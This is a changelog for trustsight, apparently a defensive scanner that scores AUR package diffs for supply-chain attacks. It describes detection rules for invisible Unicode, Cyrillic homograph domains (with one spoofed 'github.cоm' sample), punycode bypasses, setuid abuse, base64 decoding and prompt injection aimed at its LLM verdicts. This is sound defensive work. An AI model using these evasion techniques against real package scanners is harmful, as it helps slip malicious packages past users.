- Graceful `KeyboardInterrupt` handling: clean `Interrupted.` message and exit code 130 instead of an SSL/httpx traceback

### Changed

- `-h` help now includes config subcommands section (`config show`, `config set`, `config sync-rules`) and usage examples

## [0.2.2] - 2026-07-24

This release fixes a critical false positive in R013 that could score benign
packages 100/100, restores the novelty engine (Tier C) which had been inert
since v0.1, and ships a pre-seeded database of 178,491 AUR source URLs to
eliminate cold-start INCONCLUSIVE verdicts.

**Existing users must run `trustsight config sync-rules --update`** to receive
the corrected detection patterns. `rules.toml` is written only when absent, so
a package upgrade alone does not update it. The command is additive and never
overwrites a rule you have edited.

Note: `v0.2.1` was already tagged at the previous commit, and the `[0.3.0]`
section below is recorded in this changelog but was never tagged. This release
takes the next free patch number; the 0.3.0 discrepancy is left for a separate
reconciliation.

### Fixed

- R013 (FATAL) fired on legitimate localized text. U+200B-U+200D are mandatory joiners in Malayalam, Lao and other scripts, so a `GenericName[ml]=` line in a browser package scored 100/100; measured on two packages in the benign corpus. Zero-width characters now require ASCII neighbours; bidi overrides, invisible operators and tag characters still fire unconditionally. The pattern also gains U+200E/U+200F, U+2060-U+2064 and the tag block, which `unicode.py` already listed and which account for the documented recall gap.
- R058 fired on `"${pkgdir}"/usr/lib/...`, where the quote closes before the path, and on absolute paths quoted inside `echo` strings. It now requires the command to be the first token on the line and the path to start an argument.
- The maintainer was read from `.SRCINFO`, which does not carry one; checked against the AUR mirror, 0 of 200 `.SRCINFO` files have a `maintainer =` line, while every PKGBUILD opens with `# Maintainer:`. `get_maintainer_from_commit()` therefore always returned `None`, silently disabling `maintainer_changed`, the highest novelty weight (20), and C006. Now read from the PKGBUILD comment, with `.SRCINFO` as a fallback.
- `scan_diff` tracked novelty differently from the live path in three ways: it compared raw URLs instead of `normalize_url`-d ones (so every version bump read as novel), it derived "first seen globally" from the per-package set (making it identical to per-package), and it overwrote rather than OR-ed the flags across multiple URLs (so a familiar URL masked a novel one).
- Tier C novelty was inert: `observation_count` was never populated outside tests, so `maturity()` always read 0 and every novelty weight scored zero. Now sourced from `count_observations()`.
- Homograph detection missed Cyrillic confusables. `has_homograph()` only matched codepoints named `LATIN*`, while the `CONFUSABLES` table it sits beside is Cyrillic; so `github.cоm` classified as `unknown` (+20) rather than `homograph_attack` (+30). Replaced with mixed-script-per-label detection, plus punycode decoding to close the `xn--` bypass. Legitimate single-script IDNs (`.рф`, Japanese, Korean) are not flagged.
- `cli.py` called `set_config` without importing it, so `trustsight config set` raised `NameError`.
- `scripts/build_corpus.py` had a 600s timeout on the AUR bare clone, which the repository cannot meet, so the script could never complete on a fresh machine. Partial clones were also left on disk and reused silently, since `rev-parse --git-dir` succeeds on an interrupted clone.

### Added

- Novelty seed database. `scripts/generate_seed.py` builds it from the AUR git mirror by parsing `.SRCINFO` (including the arch-suffixed `source_x86_64` arrays); `trustsight seed-db` imports it. Without a seed, a fresh install has an empty `source_urls` table, so `url_first_globally` fires for github.com and every other ordinary host, and `maturity()` returns 0 because there is no analysis history; leaving every Medium verdict downgraded to INCONCLUSIVE. Import is additive and idempotent, and never overwrites a row learned from a real analysis.
- `metadata` and `maintainer_counts` tables, and `effective_observation_count()`: maturity falls back to a seed-supplied bootstrap count, and real analyses take over as soon as they outnumber it, so the tool never depends on external data permanently.
- `trustsight lint-rules` (`--file` for CI): detects unreachable, over-broad, and malformed rules. Errors on empty patterns, duplicate ids, ids owned by `analysis.py`, comment-shadowed rules, and scope contradictions; warns on rules that fire on ordinary packaging.
- Expanded ruleset R039-R059 (21 rules), calibrated against a 3322-diff stratified benign corpus and enabled by default. Fourteen fire on zero benign diffs; every remaining hit was inspected individually and all but one were true positives. R053 was split by target: setuid inside `$pkgdir` is MEDIUM (Chromium's sandbox helper legitimately needs 4755, and at MEDIUM this changes no package's risk band), while setuid on an absolute path is a separate HIGH rule, R059. The `experimental` flag remains supported for future additions.
- Programmatic rules C004 (checksum removed for unchanged source), C005 (binary artifact from untrusted source), C006 (maintainer change with new source domain), C007 (command substitution in source array).
- Rule scopes may name a PKGBUILD function (`scope = ["pkgver"]`), not just a line context.
- `added_only` rule field: match only added lines, so deleting a suspicious line no longer raises a package's score.
- Ephemeral paste and file-drop services added to the `raw_hosting` bucket.

### Changed

- Novelty weights recalibrated now that tier C is live: `url_first_globally` 15 → 10, `url_first_in_package` 10 → 5, `maintainer_first_in_package` 20 → 15. The previous values had never been exercised, because `observation_count` was never populated and the maturity multiplier was permanently 0. At full maturity they took a borderline 15-point package with a novel URL and a novel maintainer to 60 (High); the new values keep that case at 45 (Medium). Maintainer novelty remains the strongest signal.
- `_structural_findings()` is now shared by `analyze_package()` and `scan_diff()`, removing ~110 lines duplicated between the live and offline pipelines.

## [0.3.0] - 2026-07-18

- Score column renamed to "Risk Score"
- Rich progress output during review
- AUR RPC batching for performance
- Handle empty AUR repos gracefully
- FATAL severity with hard stop at 100
- Verification evidence detection and scoring
- Source pinning classification
- Code rules C001-C003 for structural anomalies
- URL normalization for novelty dedup
- Maturity-based novelty gating with Inconclusive risk level
- Scope-based rule matching (function_body context)
- R012 (prompt injection) and R013 (unicode bidi) rules
- LLM verdict integrity assertions
- scan_diff offline pipeline for benchmark use
- is_skip_justified analysis for SKIP checksums
- Fix: SKIP checksums no longer count as verification evidence
- Removed R004/R005 from TOML rules (now programmatic, context-aware)
- Default LLM provider changed to openai
- CI workflows for corpus drift monitoring
- 267 tests (was 218)

## [0.2.0] - 2026-07-15

- R004/R005 rule hardening with quote bypass fix
- Tokenizer iteration fix
- Forge classification cap
- IDN detection
- Shell variant coverage
- base64 --decode detection

## [0.1.0] - 2026-07-12

- Initial release
- R001-R011 rules
- AUR diff analysis pipeline
- Deterministic scoring
- SQLite novelty tracking
- LLM verdict integration
- Basic CLI (review, inspect, history, config)
